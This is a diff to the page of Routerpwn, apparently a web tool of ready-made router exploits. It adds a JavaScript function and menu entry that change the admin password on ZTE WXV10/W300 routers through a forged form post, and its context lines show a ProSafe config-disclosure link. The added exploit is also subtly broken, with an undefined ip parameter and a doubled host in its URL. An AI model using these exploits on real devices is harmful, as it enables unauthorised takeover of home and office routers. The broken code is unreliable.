@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.236</title>
+		<title>Routerpwn 1.20.237</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -2009,6 +2009,15 @@ function prosafe_configdisclosure(ip)
 {
     ip = ip || "192.168.1.1";
     document.location="http://"+ip+"/filesystem/startup-config";
+}
+
+function wxv10w300_changeadmin()
+{
+	ip = ip || "192.168.1.1";
+	pwd = prompt("New Password: ")
+	form = '<input type="hidden" name="uiViewTools_Password" value="' + pwd +'" />\
+      <input type="hidden" name="uiViewTools_PasswordConfirm" value="' + pwd +'" />';
+      post('http://' + ip + 'http://192.168.1.1/Forms/tools_admin_1', form);
 }
 
 /*
@@ -4683,7 +4692,14 @@ function belkinwpspin()
 
 <br><br><section id="zte">
 <h2>ZTE</h2>
-<h3><a href="javascript:img('ZXHN H108N ')">ZXHN H108N </a></h3>
+<h3><a href="javascript:img('ZXHN H108N')">ZXHN H108N</a>, <a href="javascript:img('W300')">W300</a>, <a href="javascript:img('WXV10')">WXV10</a></h3>
+
+<article>
+	<div>07/17/14</div>
+	<div><a href="http://packetstormsecurity.com/files/127129/ZTE-WXV10-W300-Disclosure-CSRF-Default.html">[+]</a></div>
+	<div><a href="javascript:wxv10w300_changeadmin()">ZTE WXV10 W300 - Change Admin Password</a></div>
+	<div><a href="javascript:wxv10w300_changeadmin(ip)">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>01/15/14</div>
